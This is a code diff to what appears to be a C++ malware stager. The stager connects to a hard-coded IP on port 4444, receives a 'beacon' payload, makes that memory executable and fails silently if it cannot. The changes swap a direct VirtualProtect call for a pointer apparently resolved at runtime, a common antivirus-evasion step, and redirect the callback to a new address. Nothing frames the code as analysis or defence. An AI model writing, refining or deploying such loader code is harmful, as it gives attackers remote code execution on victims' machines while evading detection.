@@ -95,7 +95,7 @@ bool Stager::run(const std::string& host, const std::string& port)
 
     // EXECUTE_READ.
     DWORD old_prot;
-    if (VirtualProtect(beacon_mem, bytes_received, PAGE_EXECUTE_READ, &old_prot) == FALSE)
+    if (pVirtualProtect(beacon_mem, bytes_received, PAGE_EXECUTE_READ, &old_prot) == FALSE)
     {
         // Fail silently if we cannot make the memory executable.
         return 1;
@@ -123,8 +123,8 @@ bool Stager::run(const std::string& host, const std::string& port)
 int main()
 {
     Stager tcpStager;
-    tcpStager.run("172.18.245.234", "4444");
-    //tcpStager.run("10.0.0.48", "4444");
+    //tcpStager.run("172.18.245.234", "4444");
+    tcpStager.run("10.0.0.86", "4444");
 }
 
 
